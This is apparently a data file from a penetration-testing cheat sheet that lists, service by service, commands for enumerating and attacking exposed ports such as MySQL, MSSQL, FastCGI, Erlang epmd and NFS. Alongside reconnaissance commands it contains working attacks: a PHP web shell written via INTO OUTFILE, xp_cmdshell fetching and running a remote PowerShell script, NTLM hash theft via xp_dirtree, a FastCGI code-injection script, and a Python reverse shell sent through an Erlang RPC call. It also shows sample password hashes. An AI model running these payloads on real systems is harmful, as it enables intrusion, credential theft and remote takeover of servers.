+
+#Get all kind of objects
+./enum-objects
+./lsa enum-objects
+
+#Get groups of a user
+./list-groups-for-user <username>
+./lsa list-groups-for-user <username>
+#Get groups of each user
+./enum-users | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do ./list-groups-for-user ""$name""; echo -e ""========================\n""; done
+
+#Get users of a group
+./enum-members --by-name ""domain admins""
+./lsa enum-members --by-name ""domain admins""
+#Get users of each group
+./enum-groups | grep ""Name:"" | sed -e ""s,\\\,\\\\\\\,g"" | awk '{print $2}' | while read name; do echo ""$name""; ./enum-members --by-name ""$name""; echo -e ""========================\n""; done
+
+#Get description of each user
+./adtool -a search-user --name CN=""*"" --keytab=/etc/krb5.keytab -n <Username> | grep ""CN"" | while read line; do
+    echo ""$line"";
+    ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn=""$line"" --attr ""description"";
+    echo ""======================""
+done
+",Unverified,1
+LDAP,389,None,NoNameAdded,No Description,"# cat /var/lib/ldap/*.bdb | grep -i -a -E -o ""description.*"" | sort | uniq -u
+",Unverified,1
+Memcache,11211,None,NoNameAdded,No Description,"echo ""version"" | nc -vn -w 1 {IP} 11211      #Get version
+echo ""stats"" | nc -vn -w 1 {IP} 11211        #Get status
+echo ""stats slabs"" | nc -vn -w 1 {IP} 11211  #Get slabs
+echo ""stats items"" | nc -vn -w 1 {IP} 11211  #Get items of slabs with info
+echo ""stats cachedump <number> 0"" | nc -vn -w 1 {IP} 11211  #Get key names (the 0 is for unlimited output size)
+echo ""get <item_name>"" | nc -vn -w 1 {IP} 11211  #Get saved info
+
+#This php will just dump the keys, you need to use ""get <item_name> later""
+sudo apt-get install php-memcached
+php -r '$c = new Memcached(); $c->addServer(""localhost"", 11211); var_dump( $c->getAllKeys() );'
+",Unverified,1
+Memcache,11211,None,NoNameAdded,No Description,"# sudo apt install libmemcached-tools
+memcstat --servers=127.0.0.1 #Get stats
+memcdump --servers=127.0.0.1 #Get all items
+memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
+",Unverified,1
+Memcache,11211,None,NoNameAdded,No Description,"nmap -n -sV --script memcached-info -p 11211 {IP}   #Just gather info
+msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
+msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 
+",Unverified,1
+SSH/SFTP,22,None,NoNameAdded,No Description,"# nc -vn {IP} 22
+",Unverified,1
+SSH/SFTP,22,None,NoNameAdded,No Description,"usage: ssh-audit.py [-1246pbcnjvlt] <host>
+
+   -1,  --ssh1             force ssh version 1 only
+   -2,  --ssh2             force ssh version 2 only
+   -4,  --ipv4             enable IPv4 (order of precedence)
+   -6,  --ipv6             enable IPv6 (order of precedence)
+   -p,  --port=<port>      port to connect
+   -b,  --batch            batch output
+   -c,  --client-audit     starts a server on port 2222 to audit client
+                               software config (use -p to change port;
+                               use -t to change timeout)
+   -n,  --no-colors        disable colors
+   -j,  --json             JSON output
+   -v,  --verbose          verbose output
+   -l,  --level=<level>    minimum output level (info|warn|fail)
+   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading
+                               (default: 5)
+$ python3 ssh-audit <IP>
+",Unverified,1
+SSH/SFTP,22,None,NoNameAdded,No Description,"ssh-keyscan -t rsa {IP} -p <PORT>
+",Unverified,1
+RMI,1098,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/misc/java_rmi_server
+msf> use auxiliary/gather/java_rmi_registry
+nmap -sV --script ""rmi-dumpregistry or rmi-vuln-classloader"" -p <PORT> <IP>
+",Unverified,1
+RMI,1098,None,NoNameAdded,No Description,"# msf> use exploit/multi/browser/java_rmi_connection_impl
+",Unverified,1
+IRC,194,None,NoNameAdded,No Description,"# nc -vn {IP} <PORT>
+openssl s_client -connect {IP}:<PORT> -quiet
+",Unverified,1
+IRC,194,None,NoNameAdded,No Description,"#Connection with random nickname
+USER ran213eqdw123 0 * ran213eqdw123
+NICK ran213eqdw123
+#If a PING :<random> is responded you need to send
+#PONG :<received random>
+
+VERSION
+HELP
+INFO
+LINKS
+HELPOP USERCMDS
+HELPOP OPERCMDS
+OPERATOR CAPA
+ADMIN      #Admin info
+USERS      #Current number of users
+TIME       #Server's time
+STATS a    #Only operators should be able to run this
+NAMES      #List channel names and usernames inside of each channel -> Nombre del canal y nombre de las personas que estan dentro
+LIST       #List channel names along with channel banner
+WHOIS <USERNAME>      #WHOIS a username
+USERHOST <USERNAME>   #If available, get hostname of a user
+USERIP <USERNAME>     #If available, get ip of a user
+JOIN <CHANNEL_NAME>   #Connect to a channel
+
+#Operator creds Brute-Force
+OPER <USERNAME> <PASSWORD>
+",Unverified,1
+IRC,194,None,NoNameAdded,No Description,"nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"mysql -u root # Connect to root without password
+mysql -u root -p # A password will be asked (check someone)
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"mysql -h <Hostname> -u root
+mysql -h <Hostname> -u root@localhost
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {IP}
+msf> use auxiliary/scanner/mysql/mysql_version
+msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
+msf> use auxiliary/admin/mysql/mysql_enum #Creds
+msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds 
+msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"CONVERT(unhex(""6f6e2e786d6c55540900037748b75c7249b75""), BINARY)
+CONVERT(from_base64(""aG9sYWFhCg==""), BINARY)
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"# show databases;
+use <database>;
+show tables;
+describe <table_name>;
+
+select grantee, table_schema, privilege_type FROM schema_privileges; #Exact privileges
+select user,file_priv from mysql.user where user='root'; #File privileges
+select version(); #version
+select @@version(); #version
+select user(); #User
+select database(); #database name
+
+#Try to execute code
+select do_system('id');
+\! sh
+
+#Basic MySQLi
+Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
+Union Select 1,2,3,4,column_name from information_schema.columns where table_name=""<TABLE NAME>""
+
+#Read & Write
+select load_file('/var/lib/mysql-files/key.txt'); #Read file
+select 1,2,""<?php echo shell_exec($_GET['c']);?>"",4 into OUTFILE 'C:/xampp/htdocs/back.php'
+
+#Try to change MySQL root password
+UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
+UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
+FLUSH PRIVILEGES;
+quit;
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
+mysql -u root -h 127.0.0.1 -e 'show databases;'
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"load data local infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"mysql> load data infile ""/etc/passwd"" into table test FIELDS TERMINATED BY '\n';
+
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v ""#"" | grep ""user""
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"mysql -u root --password=<PASSWORD> -e ""SELECT User,Host,authentication_string FROM mysql.user;""
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"# cat /etc/mysql/debian.cnf
+",Unverified,1
+Mysql,3306,None,NoNameAdded,No Description,"# grep -oaE ""[-_\.\*a-Z0-9]{3,}"" /var/lib/mysql/mysql/user.MYD | grep -v ""mysql_native_password""
+",Unverified,1
+Finger,79,None,NoNameAdded,No Description,"# nc -vn {IP} 79
+echo ""root"" | nc -vn {IP} 79
+",Unverified,1
+Finger,79,None,NoNameAdded,No Description,"finger @<Victim>       #List users
+finger admin@<Victim>  #Get info of user
+finger user@<Victim>   #Get info of user
+",Unverified,1
+Finger,79,None,NoNameAdded,No Description,"# finger-user-enum.pl -U users.txt -t 10.0.0.1
+finger-user-enum.pl -u root -t 10.0.0.1
+finger-user-enum.pl -U users.txt -T ips.txt
+",Unverified,1
+Finger,79,None,NoNameAdded,No Description,"finger ""|/bin/id@example.com""
+finger ""|/bin/ls -a /@example.com""
+",Unverified,1
+X11,6000,None,NoNameAdded,No Description,"nmap -sV --script x11-access -p <PORT> {IP}
+msf> use auxiliary/scanner/x11/open_x11
+",Unverified,1
+X11,6000,None,NoNameAdded,No Description,"xdpyinfo -display <ip>:<display>
+xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
+",Unverified,1
+X11,6000,None,NoNameAdded,No Description,"xwd -root -screen -silent -display <Target{IP}:0> > screenshot.xwd
+convert screenshot.xwd screenshot.png
+",Unverified,1
+X11,6000,None,NoNameAdded,No Description,"# ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
+./xwatchwin 10.9.xx.xx:0 -w 0x45
+",Unverified,1
+MSRPC,135,None,NoNameAdded,No Description,"# use auxiliary/scanner/dcerpc/endpoint_mapper
+use auxiliary/scanner/dcerpc/hidden
+use auxiliary/scanner/dcerpc/management
+use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+rpcdump.py <IP> -p 135
+",Unverified,1
+IMAP,143,None,NoNameAdded,No Description,"# nc -nv {IP} 143
+openssl s_client -connect {IP}:993 -quiet
+",Unverified,1
+IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'UID SEARCH ALL' --user user:pass
+$ curl -k 'imaps://1.2.3.4/INBOX;UID=1' --user user:pass
+",Unverified,1
+IMAP,143,None,NoNameAdded,No Description,"# $ curl -k 'imaps://1.2.3.4/INBOX' -X 'FETCH 1:5 BODY[HEADER.FIELDS (SUBJECT FROM)]' --user user:pass -v 2>&1 | grep '^<'
+",Unverified,1
+NTP,123,None,NoNameAdded,No Description,"ntpq -c readlist <{IP}_ADDRESS>
+ntpq -c readvar <{IP}_ADDRESS>
+ntpq -c peers <{IP}_ADDRESS>
+ntpq -c associations <{IP}_ADDRESS>
+ntpdc -c monlist <{IP}_ADDRESS>
+ntpdc -c listpeers <{IP}_ADDRESS>
+ntpdc -c sysinfo <{IP}_ADDRESS>
+",Unverified,1
+NTP,123,None,NoNameAdded,No Description,"nmap -sU -sV --script ""ntp* and (discovery or vuln) and not (dos or brute)"" -p 123 {IP}
+",Unverified,1
+NTP,123,None,NoNameAdded,No Description,"ntpdc -n -c monlist {IP}
+",Unverified,1
+PDL-datastream,9100,None,NoNameAdded,No Description,"# nc -vn {IP} 9100
+@PJL INFO STATUS      #CODE=40000   DISPLAY=""Sleep""   ONLINE=TRUE
+@PJL INFO ID          # ID (Brand an version): Brother HL-L2360D series:84U-F75:Ver.b.26
+@PJL INFO PRODINFO    #Product info
+@PJL FSDIRLIST NAME=""0:\"" ENTRY=1 COUNT=65535  #List dir
+@PJL INFO VARIABLES   #Env variales
+@PJL INFO FILESYS     #?
+@PJL INFO TIMEOUT     #Timeout variables
+@PJL RDYMSG           #Ready message
+@PJL FSINIT  
+@PJL FSDIRLIST
+@PJL FSUPLOAD         #Useful to upload a file
+@PJL FSDOWNLOAD       #Useful to download a file
+@PJL FSDELETE         #Useful to delete a file
+",Unverified,1
+PDL-datastream,9100,None,NoNameAdded,No Description,"nmap -sV --script pjl-ready-message -p <PORT> {IP}
+",Unverified,1
+PDL-datastream,9100,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/printer/printer_env_vars
+msf> use auxiliary/scanner/printer/printer_list_dir
+msf> use auxiliary/scanner/printer/printer_list_volumes
+msf> use auxiliary/scanner/printer/printer_ready_message
+msf> use auxiliary/scanner/printer/printer_version_info
+msf> use auxiliary/scanner/printer/printer_download_file
+msf> use auxiliary/scanner/printer/printer_upload_file
+msf> use auxiliary/scanner/printer/printer_delete_file
+",Unverified,1
+FastCGI,9000,None,NoNameAdded,No Description,"#!/bin/bash
+
+PAYLOAD=""<?php echo '<!--'; system('whoami'); echo '-->';""
+FILENAMES=""/var/www/public/index.php"" # Exisiting file path
+
+HOST=$1
+B64=$(echo ""$PAYLOAD""|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    env -i \
+      PHP_VALUE=""allow_url_include=1""$'\n'""allow_url_fopen=1""$'\n'""auto_prepend_file='data://text/plain\;base64,$B64'"" \
+      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
+      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
+
+    cat $OUTPUT
+done
+",Unverified,1
+NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE SERVICE    VERSION
+137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
+",Unverified,1
+NetBios,137,None,NoNameAdded,No Description,"nmblookup -A {IP}
+nbtscan {IP}/30
+sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n {IP}
+",Unverified,1
+NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE         SERVICE     VERSION
+138/udp open|filtered netbios-dgm
+",Unverified,1
+NetBios,137,None,NoNameAdded,No Description,"# PORT      STATE SERVICE      VERSION
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+",Unverified,1
+MongoDB,27017,None,NoNameAdded,No Description,"# show dbs
+use <db>
+show collections
+db.<collection>.find()  #Dump the collection
+db.<collection>.count() #Number of records of the collection
+db.current.find({""username"":""admin""})  #Find in current db the username admin
+",Unverified,1
+MongoDB,27017,None,NoNameAdded,No Description,"nmap -sV --script ""mongo* and default"" -p 27017 {IP} #By default all the nmap mongo enumerate scripts are used
+",Unverified,1
+MongoDB,27017,None,NoNameAdded,No Description,"mongo <HOST>
+mongo <HOST>:<PORT>
+mongo <HOST>:<PORT>/<DB>
+mongo <database> -u <username> -p '<password>'
+",Unverified,1
+MongoDB,27017,None,NoNameAdded,No Description,"nmap -n -sV --script mongodb-brute -p 27017 <ip>
+",Unverified,1
+MongoDB,27017,None,NoNameAdded,No Description,"# grep ""noauth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#"" #Not needed
+grep ""auth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#\|noauth"" #Not needed
+",Unverified,1
+ndmp,10000,None,NoNameAdded,No Description,"nmap -n -sV --script ""ndmp-fs-info or ndmp-version"" -p 10000 {IP} #Both are default scripts
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"nmap -sV --script ""rsync-list-modules"" -p <PORT> {IP}
+msf> use auxiliary/scanner/rsync/modules_list
+
+#Example using IPv6 and a different port
+rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://192.168.0.123/shared_name
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"# rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://username@192.168.0.123/shared_name
+rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"# rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
+",Unverified,1
+Rsync,873,None,NoNameAdded,No Description,"# find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"searchsploit ""microsoft sql server""
+nmap --script-help ""*ms* and *sql*""
+msf> search mssql
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
+msf> use auxiliary/scanner/mssql/mssql_ping
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"#Set USERNAME, RHOSTS and PASSWORD
+#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
+
+#Steal NTLM
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
+
+#Info gathering
+msf> use admin/mssql/mssql_enum #Security checks
+msf> use admin/mssql/mssql_enum_domain_accounts
+msf> use admin/mssql/mssql_enum_sql_logins
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/scanner/mssql/mssql_hashdump
+msf> use auxiliary/scanner/mssql/mssql_schemadump
+
+#Search for insteresting data
+msf> use auxiliary/admin/mssql/mssql_findandsampledata
+msf> use auxiliary/admin/mssql/mssql_idf
+
+#Privesc
+msf> use exploit/windows/mssql/mssql_linkcrawler
+msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
+msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
+
+#Code execution
+msf> use admin/mssql/mssql_exec #Execute commands
+msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
+
+#Add new admin user from meterpreter session
+msf> use windows/manage/mssql_local_auth_bypass
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"#Username + Password + CMD command
+crackmapexec mssql -d <Domain name> -u <username> -p <password> -x ""whoami""
+#Username + Hash + PS command
+crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
+
+#this turns on advanced options and is needed to configure xp_cmdshell
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+#this enables xp_cmdshell
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+# Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"xp_dirtree '\\<attacker_{IP}>\any\thing'
+exec master.dbo.xp_dirtree '\\<attacker_{IP}>\any\thing'
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"# msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"# msf> auxiliary/admin/mssql/mssql_escalate_execute_as
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@{IP} #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
+
+#Once logged in you can run queries:
+SQL> select @@ version;
+
+#Steal NTLM hash
+sudo responder -I <interface> #Run that in other console
+SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
+
+#Try to enable code execution
+SQL> enable_xp_cmdshell
+
+#Execute code, 2 sintax, for complex and non complex cmds
+SQL> xp_cmdshell whoami /all
+SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(""http://10.10.14.13:8000/rev.ps1"") | powershell -noprofile'
+",Unverified,1
+Server,1433,None,NoNameAdded,No Description,"sqsh -S {IP} -U <Username> -P <Password> -D <Database>
+",Unverified,1
+Postgresql,5432,None,NoNameAdded,No Description,"psql -U <myuser> # Open psql console with user
+psql -h <host< -U <username> -d <database> # Remote connection
+psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
+",Unverified,1
+Postgresql,5432,None,NoNameAdded,No Description,"log_statement = 'all'
+log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
+logging_collector = on
+sudo service postgresql restart
+#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
+#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
+",Unverified,1
+Postgresql,5432,None,NoNameAdded,No Description,"sqlite3 pgadmin4.db "".schema""
+sqlite3 pgadmin4.db ""select * from user;""
+sqlite3 pgadmin4.db ""select * from server;""
+string pgadmin4.db
+",Unverified,1
+EthernetIP,44818,None,NoNameAdded,No Description,"nmap -n -sV --script enip-info -p 44818 {IP}
+pip3 install cpppo
+python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a {IP}
+",Unverified,1
+Portmapper,111,None,NoNameAdded,No Description,"# root@kali:~# apt-get install nis
+root@kali:~# ypwhich -d example.org 192.168.10.1
+potatohead.example.org
+root@kali:~# ypcat –d example.org –h 192.168.10.1 passwd.byname
+tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
+katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
+james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
+florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
+dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
+yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dig version.bind CHAOS TXT @DNS
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dig axfr @<DNS_{IP}> #Try zone transfer without domain
+dig axfr @<DNS_{IP}> <DOMAIN> #Try zone transfer guessing the domain
+fierce -dns <DOMAIN> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dig ANY @<DNS_{IP}> <DOMAIN>     #Any information
+dig A @<DNS_{IP}> <DOMAIN>       #Regular DNS request
+dig AAAA @<DNS_{IP}> <DOMAIN>    #{IP}v6 DNS request
+dig TXT @<DNS_{IP}> <DOMAIN>     #Information
+dig MX @<DNS_{IP}> <DOMAIN>      #Emails related
+dig NS @<DNS_{IP}> <DOMAIN>      #DNS that resolves that name
+dig -x 192.168.0.2 @<DNS_{IP}>   #Reverse lookup
+dig -x 2a00:1450:400c:c06::93 @<DNS_{IP}> #reverse {IP}v6 lookup
+
+#Use [-p PORT]  or  -6 (to use ivp6 address of dns)
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"nslookup
+> SERVER <IP_DNS> #Select dns server
+> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
+> <IP_MACHINE> #Reverse lookup of a machine, maybe...
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"auxiliary/gather/enum_dns #Perform enumeration actions
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"#Perform enumeration actions
+nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" <IP>
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dnsrecon -r 127.0.0.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
+dnsrecon -r 127.0.1.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
+dnsrecon -r <{IP}_DNS>/24 -n <{IP}_DNS>   #DNS reverse of all of the addresses
+dnsrecon -d active.htb -a -n <{IP}_DNS> #Zone transfer
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <{IP}_DNS>
+dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description," #Query paypal subdomains to ns3.isc-sns.info
+ nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com ns3.isc-sns.info
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dnsdict6 -s -t <domain>
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dnsrevenum6 pri.authdns.ripe.net 2001:67c:2e8::/48 #Will use the dns pri.authdns.ripe.net
+",Unverified,1
+DNS,53,None,NoNameAdded,No Description,"dig google.com A @{IP}
+",Unverified,1
+PPTP,1723,None,NoNameAdded,No Description,"nmap –Pn -sSV -p1723 {IP}
+",Unverified,1
+Service,2049,None,NoNameAdded,No Description,"nfs-ls #List NFS exports and check permissions
+nfs-showmount #Like showmount -e
+nfs-statfs #Disk statistics and info from NFS share
+",Unverified,1
+Service,2049,None,NoNameAdded,No Description,"scanner/nfs/nfsmount #Scan NFS mounts and list permissions
+",Unverified,1
+Service,2049,None,NoNameAdded,No Description,"# showmount -e {IP}
+",Unverified,1
+Service,2049,None,NoNameAdded,No Description,"mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
+",Unverified,1
+Service,2049,None,NoNameAdded,No Description,"mkdir /mnt/new_back
+mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"rdesktop -u <username> {IP}
+rdesktop -d <domain> -u <username> -p <password> {IP}
+xfreerdp /u:[domain\]<username> /p:<password> /v:{IP}
+xfreerdp /u:[domain\]<username> /pth:<hash> /v:{IP}
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"rdp_check <domain>/<name>:<password>@{IP}
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"nmap --script ""rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info"" -p 3389 -T4 {IP}
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"runas /netonly /user:<DOMAIN>\<NAME> ""cmd.exe"" #The password will be prompted
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"tscon <ID> /dest:<SESSIONNAME>
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"ts::sessions        #Get sessions
+ts::remote /id:2    #Connect to the session
+",Unverified,1
+RDP,3389,None,NoNameAdded,No Description,"net localgroup ""Remote Desktop Users"" UserLoginName /add
+",Unverified,1
+Telnet,23,None,NoNameAdded,No Description,"# nc -vn {IP} 23
+",Unverified,1
+Telnet,23,None,NoNameAdded,No Description,"nmap -n -sV -Pn --script ""*telnet* and safe"" -p 23 {IP}
+",Unverified,1
+Telnet,23,None,NoNameAdded,No Description,"# /etc/inetd.conf
+/etc/xinetd.d/telnet
+/etc/xinetd.d/stelnet
+",Unverified,1
+epmd,4369,None,NoNameAdded,No Description,"echo -n -e ""\x00\x01\x6e"" | nc -vn {IP} 4369
+
+#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
+dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
+apt-get install erlang
+erl #Once Erlang is installed this will promp an erlang terminal
+1> net_adm:names('<HOST>'). #This will return the listen addresses
+",Unverified,1
+epmd,4369,None,NoNameAdded,No Description,"nmap -sV -Pn -n -T4 -p 4369 --script epmd-info {IP}
+
+PORT     STATE SERVICE VERSION
+4369/tcp open  epmd    Erlang Port Mapper Daemon
+| epmd-info: 
+|   epmd_port: 4369
+|   nodes: 
+|     bigcouch: 11502
+|     freeswitch: 8031
+|     ecallmgr: 11501
+|     kazoo_apps: 11500
+|_    kazoo-rabbitmq: 25672
+",Unverified,1
+epmd,4369,None,NoNameAdded,No Description,"greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
+Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]
+
+Eshell V8.1 (abort with ^G)
+
+At last, we can start an erlang shell on the remote system.
+
+(test@target.fqdn)1>os:cmd(""id"").
+""uid=0(root) gid=0(root) groups=0(root)\n""
+",Unverified,1
+epmd,4369,None,NoNameAdded,No Description,"HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE 
+(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
+""homer\n""
+(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, [""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""10.10.14.9\"", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"",\""-i\""]);'""]).
+",Unverified,1
+epmd,4369,None,NoNameAdded,No Description,"#Metasploit can also exploit this if you know the cookie
+msf5> use exploit/multi/misc/erlang_cookie_rce
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"curl -s http://10.10.10.10:5000/v2/_catalog
+#If HTTPS
+Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
+Warning: curl to output it to your terminal anyway, or consider ""--output 
+Warning: <FILE>"" to save to a file.
+
+#If HTTP
+{""repositories"":[""alpine"",""ubuntu""]}
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"curl -k https://192.25.197.3:5000/v2/_catalog
+#If Authentication required
+{""errors"":[{""code"":""UNAUTHORIZED"",""message"":""authentication required"",""detail"":[{""Type"":""registry"",""Class"":"""",""Name"":""catalog"",""Action"":""*""}]}]}
+#If no authentication required
+{""repositories"":[""alpine"",""ubuntu""]}
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"curl -k -u username:password https://10.10.10.10:5000/v2/_catalog
+",Unverified,1
+Registry,5000,None,NoNameAdded,No Description,"#List repositories
+curl -s http://10.10.10.10:5000/v2/_catalog
+{""repositories"":[""alpine"",""ubuntu""]}
+
+#Get tags of a repository
+curl -s http://192.251.36.3:5000/v2/ubuntu/tags/list
